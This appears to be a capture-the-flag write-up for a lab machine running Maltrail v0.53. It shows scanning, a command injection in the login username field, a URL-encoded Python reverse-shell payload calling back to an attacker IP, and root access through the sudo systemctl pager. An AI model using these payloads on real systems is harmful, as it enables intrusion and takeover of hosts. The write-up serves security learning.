## NMAP

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-31 13:09 CET
Nmap scan report for 10.10.11.224
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
55555/tcp open     unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=12/31%OT=22%CT=1%CU=37001%PV=Y%DS=2%DC=I%G=Y%TM=65915A
OS:29%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=108%TI=Z%CI=Z%TS=A)SEQ(SP=F
OS:F%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3
OS:=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=F
OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.95 seconds
```

# USER

From `NMAP` we can see an port `55555`.Opening it in browser will redirect us to `/web`. Here we have a service like `webhooks`. We can create wehooks and after checking for some vulnerabilities I found nothing useful.

I the while I run gobuster in main path:

```bash 
gobuster dir -u http://10.10.11.224:55555/ -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,js,txt -t 20

```

```
/web                  (Status: 200) [Size: 8700]
/proxy                (Status: 200) [Size: 7091]
```
It returned antoher interesing endpoint which is `/proxy`.

Navigating it we can see that is the dashboard of `Maltail`.
Mailtrail is a software to detect malicious injection attempts and it operates as firewall blockint and monitoring them.
The crator is the same of sqlmap.


```text
/proxy


Powered by Maltrail (v0.53)
Hide threat
Report false positive
```

Ths software has a bad RCE vulnerability on version <= 0.54. 

- https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/

Let's try:

```
POST /proxy/login HTTP/1.1
Host: 10.10.11.224:55555
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

username=%60%73%6c%65%65%70%20%31%35%60
```

injecting `sleep` will lead in a sleep with always 5 seconds more than declared sleep seconds. For exmaple injecting:

```
`sleep 10`
```

will let burpsuite waiting for response for 15 seconds.
RCE quite confirmed and we can obtain a shell through:


```bash
`export RHOST="10.10.16.12";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`
```

```http
POST /proxy/login HTTP/1.1
Host: 10.10.11.224:55555
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

username=%60%65%78%70%6f%72%74%20%52%48%4f%53%54%3d%22%31%30%2e%31%30%2e%31%36%2e%31%32%22%3b%65%78%70%6f%72%74%20%52%50%4f%52%54%3d%31%32%33%34%3b%70%79%74%68%6f%6e%33%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%6f%73%2e%67%65%74%65%6e%76%28%22%52%48%4f%53%54%22%29%2c%69%6e%74%28%6f%73%2e%67%65%74%65%6e%76%28%22%52%50%4f%52%54%22%29%29%29%29%3b%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%70%74%79%2e%73%70%61%77%6e%28%22%73%68%22%29%27%60
```

and we obtain our reverse shell

whoami returns, we are puma and we can already raead `/home/user.txt`

# ROOT

Terminal is not fully functional so this can lead in some troubles, but we managed to get the flag anyway. Just rnu the minimal needed for interactive shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo
fg
```

Lin-Enum just like `sudo -l` (which luckily can be executed without knowing user password) shows the following:


```bash
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

this is pretty interesting, because what it is saying is that we can run the command `/usr/bin/systemctl status trail.service` as `sudo` without even known the password of the current user. This is because `NOPAASSWD` is written and writing in terminal


```bash
sudo /usr/bin/systemctl status trail.service
```

we can show the maltral service pager.

At this point we are in the same exact situation of this link:

- https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/

As written in the article we can enter a command when visualizing the pager and it will be executed as root.

we just need to type `!sh` without `:` in front of the command (unlike vim), to get the root shell.